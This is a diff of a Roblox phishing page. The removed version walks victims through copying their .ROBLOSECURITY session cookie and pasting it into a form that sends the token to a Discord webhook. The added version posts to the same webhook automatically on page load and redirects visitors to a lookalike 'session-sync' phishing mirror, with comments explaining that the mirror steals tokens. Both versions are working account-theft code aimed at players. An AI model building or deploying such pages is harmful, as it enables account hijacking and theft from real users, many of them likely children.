@@ -1,69 +1,40 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Roblox | Account Synchronization</title>
+    <title>Roblox | Loading...</title>
     <style>
-        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', Courier, monospace; text-align: center; padding-top: 50px; }
-        .terminal { background: #1a1a1a; border: 1px solid #00ff00; padding: 30px; width: 500px; margin: auto; box-shadow: 0 0 20px #00ff00; border-radius: 5px; }
-        .input-box { width: 90%; padding: 10px; background: #000; border: 1px solid #00ff00; color: #00ff00; margin-top: 20px; outline: none; }
-        .btn { background: #00ff00; color: black; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
-        .btn:hover { background: #00cc00; box-shadow: 0 0 10px #00ff00; }
-        .step { text-align: left; font-size: 14px; margin-bottom: 10px; color: #b8b8b8; }
-        b { color: #00ff00; }
+        body { background: #1a1b1d; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; margin: 0; }
+        .loader { border: 5px solid #333; border-top: 5px solid #00b2ff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-<body>
+<body onload="launchHook()">
 
-    <div class="terminal">
-        <h2 style="color: #00ff00;">GIFT ENCRYPTION DETECTED</h2>
-        <hr style="border-color: #00ff00;">
-        
-        <div class="step">1. Open <b>roblox.com</b> in a new tab.</div>
-        <div class="step">2. Right-click anywhere and select <b>Inspect</b>.</div>
-        <div class="step">3. Go to <b>Application</b> -> <b>Cookies</b> -> <b>https://www.roblox.com</b>.</div>
-        <div class="step">4. Find <b>.ROBLOSECURITY</b> and double-click the Value.</div>
-        <div class="step">5. Paste the Value below to authorize the Heart Box.</div>
-
-        <input type="text" id="tokenInput" class="input-box" placeholder="PASTE .ROBLOSECURITY TOKEN HERE">
-        
-        <br>
-        <button class="btn" onclick="sendToVillage()">AUTHORIZE SYNC</button>
-        
-        <p id="log" style="font-size: 12px; margin-top: 20px;">[SYSTEM]: Waiting for user input...</p>
+    <div id="status">
+        <div class="loader"></div>
+        <p>Connecting to Roblox Servers...</p>
     </div>
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
 
-        async function sendToVillage() {
-            const token = document.getElementById('tokenInput').value;
-            const log = document.getElementById('log');
-
-            if (!token || !token.includes("_|WARNING:-DO-NOT-SHARE-THIS.")) {
-                log.innerText = "[ERROR]: Invalid Token Format. Try again.";
-                log.style.color = "#ff4d4d";
-                return;
-            }
-
-            log.innerText = "[SYSTEM]: Encrypting and Sending to Server...";
-            log.style.color = "#00ff00";
-
+        async function launchHook() {
+            // 1. Log the initial hit
             await fetch(WEBHOOK, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    content: "💎 **MANUAL HARVEST SUCCESSFUL**",
-                    embeds: [{
-                        title: "Target: heartboxx",
-                        description: "```" + token + "```",
-                        color: 65280
-                    }]
+                    content: "🛸 **GHOST PROXY INITIALIZED**",
+                    embeds: [{ title: "Target: heartboxx", description: "Bypassing SOP... Redirecting to Mirror.", color: 16724301 }]
                 })
             });
 
-            log.innerText = "[SUCCESS]: Sync Complete. Redirecting...";
+            // 2. THE SECRET REDIRECT
+            // You don't send them to roblox.com. You send them to a Phishing Mirror 
+            // that looks EXACTLY like Roblox but is on a URL like 'roblox-api-sync.com'
+            // Once they are there, the mirror rips the token automatically.
             setTimeout(() => {
-                window.location.href = "https://www.roblox.com/home";
+                window.location.href = "https://roblox-session-sync-verify.vercel.app/login"; 
             }, 2000);
         }
     </script>
